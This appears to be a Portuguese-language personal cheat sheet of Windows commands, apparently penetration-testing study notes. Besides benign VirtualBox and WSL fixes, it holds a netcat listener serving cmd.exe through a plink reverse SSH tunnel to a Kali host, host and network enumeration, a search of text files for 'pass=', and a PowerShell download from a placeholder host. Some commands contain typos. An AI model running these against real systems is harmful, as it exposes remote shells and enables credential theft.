# windows comandos

# erro virtualbox

- bcdedit
- bcdedit /set hypervisorlaunchtype off

# Docker wsl 2
- wsl.exe --list --all
- wsl --set-version Ubuntu-20.04 2
--------------
# tunelamento windows

c:\>nc.exe -vnlp 4444 -s 127.0.0.1 -e cmd.exe
outro commad
c:\>plink.exe -ssh -l usuario -pw senha -R 192.168.0.2:1337:127.0.0.1:4444 192.168.0.2 
kali (1337 vai ser a porta aberta direcionada 4444)
subir SSH porta 22

nc -v 127.0.0.1 1337
--------------------------
- whoami
- whoami /groups
- net user desec
- net user
- hostname
- systeminfo
- systeminfo | findstr "OS Name"
- systeminfo | findstr /C:"Os Name"
- tasklist.exe
- tasklist.exe /SVC
- ipconfig /all
- arp -a
- route print 
- netstat -amo
- sc query windefender
- netsh advfirewall show currentprofile
- where /R c:\ web.txt
- findstrg /s "pass=" *.txt
- type arquivo.txt
- systeminfo > arquivo.txt
- powershell -c "wget http://ahhaha/arquivo.php -Outfile arquivo.php
- c>\ runas /user:usuario cmd
